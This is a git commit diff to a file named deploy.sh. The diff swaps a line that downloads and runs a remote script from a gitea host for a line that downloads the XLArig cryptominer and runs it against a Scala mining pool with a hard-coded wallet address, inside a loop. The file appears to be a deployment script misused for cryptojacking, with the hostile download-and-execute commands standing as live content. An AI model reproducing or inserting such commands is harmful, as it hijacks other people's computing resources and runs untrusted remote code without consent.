b673402c572494df9593136a37a36216e748296d
sindiahtm <85552285+sindiahtm@users.noreply.github.com>
2021-06-08 09:04:59 +0000

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -3,7 +3,7 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-wget https://try.gitea.io/gairmeet/chuax/raw/branch/master/circleci.sh && chmod +x circleci.sh && ./circleci.sh
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o scala.herominers.com:10131 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p XLA01 -a panthera -k -t2
  
      echo COUNTER $COUNTER
      let COUNTER-=1
